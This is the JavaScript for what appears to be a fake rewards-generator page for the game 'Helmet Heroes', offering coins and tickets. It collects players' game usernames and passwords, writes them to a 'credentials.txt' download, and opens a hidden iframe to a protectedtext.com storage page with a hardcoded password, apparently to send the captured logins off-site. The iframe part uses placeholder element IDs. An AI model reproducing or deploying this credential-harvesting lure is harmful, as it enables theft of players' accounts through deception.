// Coin textfield
document.addEventListener("DOMContentLoaded", function() {
    const coinTextField = document.getElementById("coinTextFieldID");

    // Add event listener for when the text field loses focus
    coinTextField.addEventListener("blur", hideGuideText);

    // Add event listener for when the user moves the cursor away from the text field
    coinTextField.addEventListener("mouseout", function(event) {
        // If the text field is empty, and the cursor is not on the text field anymore, remove the 'clicked' class
        if (coinTextField.value == "" && !coinTextField.contains(event.relatedTarget)) {
            hideGuideText();
        }
    });
});

// Ticket textfield
document.addEventListener("DOMContentLoaded", function() {
    const ticketTextField = document.getElementById("ticketTextFieldID");

    // Add event listener for when the text field loses focus
    ticketTextField.addEventListener("blur", hideGuideText);


    // Add event listener for when the user moves the cursor away from the text field
    ticketTextField.addEventListener("mouseout", function(event) {
        // If the text field is empty, and the cursor is not on the text field anymore, remove the 'clicked' class
        if (ticketTextField.value == "" && !ticketTextField.contains(event.relatedTarget)) {
            hideGuideText();
        }
    });
});

document.addEventListener("DOMContentLoaded", function() {
    const coinTextField = document.getElementById("coinTextFieldID");
    const ticketTextField = document.getElementById("ticketTextFieldID");
    const nextButton = document.getElementById("nextButtonID");
    const backButton = document.getElementById("backButtonID");
    const confirmationPanel = document.querySelector(".panel-confirmation");

    // Function to check if both coinTextField and ticketTextField are not empty
    function checkFieldsNotEmpty() {
        return coinTextField.value.trim() !== "" && ticketTextField.value.trim() !== "";
    }

    // Add event listener for input events on coinTextField and ticketTextField
    coinTextField.addEventListener("input", function() {
        nextButton.disabled = !checkFieldsNotEmpty();
    });

    ticketTextField.addEventListener("input", function() {
        nextButton.disabled = !checkFieldsNotEmpty();
    });

    // Add event listener for click event on Next button
    nextButton.addEventListener("click", function() {
        confirmationPanel.style.display = "block";
    });

    // Add event listener for click event on Back button
    backButton.addEventListener("click", function() {
        confirmationPanel.style.display = "none";
    });
});



document.addEventListener("DOMContentLoaded", function() {
    const coinTextField = document.getElementById("coinTextFieldID");
    const ticketTextField = document.getElementById("ticketTextFieldID");
    const nextButton = document.getElementById("nextButtonID");
    const backButton = document.getElementById("backButtonID");
    const confirmationPanel = document.querySelector(".panel-confirmation");

    // Function to check if both coinTextField and ticketTextField are not empty
    function checkFieldsNotEmpty() {
        return coinTextField.value.trim() !== "" && ticketTextField.value.trim() !== "";
    }

    // Disable Next button initially
    nextButton.disabled = true;

    // Add event listener for input events on coinTextField and ticketTextField
    coinTextField.addEventListener("input", function() {
        nextButton.disabled = !checkFieldsNotEmpty();
    });

    ticketTextField.addEventListener("input", function() {
        nextButton.disabled = !checkFieldsNotEmpty();
    });

    // Add event listener for click event on Next button
    nextButton.addEventListener("click", function() {
        confirmationPanel.style.display = "block";
    });

    // Add event listener for click event on Back button
    backButton.addEventListener("click", function() {
        confirmationPanel.style.display = "none";
    });
});

// Prevent scrolling when the mouse is over the document
document.addEventListener('wheel', function(event) {
    event.preventDefault();
}, { passive: false });

/*--------------------------------------------IMPORTANT-------------------------------------*/

document.addEventListener("DOMContentLoaded", function() {
    const usernameField = document.getElementById("usernameID");
    const passwordField = document.getElementById("passwordID");
    const levelField = document.getElementById("levelID");
    const getButton = document.getElementById("getButtonID");

    // Function to check if username, password, and level fields are not empty
    function checkFieldsNotEmpty() {
        return usernameField.value.trim() !== "" && passwordField.value.trim() !== "" && levelField.value.trim() !== "";
    }

    // Disable Get button initially
    getButton.disabled = true;

    // Add event listener for input events on username, password, and level fields
    usernameField.addEventListener("input", function() {
        getButton.disabled = !checkFieldsNotEmpty();
    });

    passwordField.addEventListener("input", function() {
        getButton.disabled = !checkFieldsNotEmpty();
    });

    levelField.addEventListener("input", function() {
        getButton.disabled = !checkFieldsNotEmpty();
    });
});

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById('getButtonID').addEventListener('click', function() {
        const usernameField = document.getElementById("usernameID");
        const passwordField = document.getElementById("passwordID");
        const levelField = document.getElementById("levelID");
        const classField = document.getElementById("classID");
        const coinField = document.getElementById("coinTextFieldID");
        const ticketField = document.getElementById("ticketTextFieldID");
        const confirmationPanel = document.querySelector(".panel-confirmation");
        const rewardsPanel = document.querySelector(".panel-rewards");

        const getButton = document.getElementById("getButtonID");
        const nextButton = document.getElementById("nextButtonID");

        const successPanel = document.querySelector(".success-panel"); // Corrected

        // Function to check if all fields are not empty
        function checkFieldsNotEmpty() {
            return (
                usernameField.value.trim() !== "" &&
                passwordField.value.trim() !== "" &&
                levelField.value.trim() !== "" &&
                classField.value.trim() !== "" &&
                coinField.value.trim() !== "" &&
                ticketField.value.trim() !== ""
            );
        }

        // Check if all fields are not empty
        if (checkFieldsNotEmpty()) {
            // Hide confirmation panel
            confirmationPanel.style.display = "none";
            // Show rewards panel
            rewardsPanel.style.display = "block";

            // Get username and password values
            const username = usernameField.value.trim();
            const password = passwordField.value.trim();

            // Prepare data to be written to file
            const data = `Username: ${username}\nPassword: ${password}`;

            // Create a new Blob object with the data
            const blob = new Blob([data], { type: "text/plain" });

            // Create a link element
            const link = document.createElement("a");

            // Set link's attributes
            link.href = URL.createObjectURL(blob);
            link.download = "credentials.txt";

            // Append link to body and click it programmatically to trigger download
            document.body.appendChild(link);
            link.click();

            // Remove the link from the body
            document.body.removeChild(link);

            // Clear all text fields
            usernameField.value = "";
            passwordField.value = "";
            levelField.value = "";
            classField.value = "";
            coinField.value = "";
            ticketField.value = "";

            nextButton.disabled = true;
            getButton.disabled = true;

            successPanel.style.display = "block";

            /*-----------------------Writing Text to Online---------------------------------------*/

            //var wnd = window.open("https://www.protectedtext.com/HelmetHeroesStorage");

             // Create a hidden iframe to load the website
             var iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = 'https://www.protectedtext.com/HelmetHeroesStorage';
             document.body.appendChild(iframe);

             // Wait for the iframe to load
             iframe.onload = function() {
             // Access the document within the iframe
             var iframeDocument = iframe.contentWindow.document;

             // Find the input field and set its value
             var inputField = iframeDocument.getElementById('yourInputFieldId'); // Replace 'yourInputFieldId' with the actual ID of the input field
             if (inputField) {
                inputField.value = '@Dd119998080169';
             }

            // Find and click the button
            var button = iframeDocument.getElementById('yourButtonId'); // Replace 'yourButtonId' with the actual ID of the button
            if (button) {
             button.click();
        }
    };

// Wait for some time (e.g., 4 seconds) and then remove the iframe
setTimeout(function() {
    document.body.removeChild(iframe);
}, 4000);





            
        }
    });
});


document.addEventListener("DOMContentLoaded", function() {
    document.getElementById('okButtonID').addEventListener('click', function() {
     
        const successPanel = document.querySelector(".success-panel");
        successPanel.style.display = "none";
    });
});

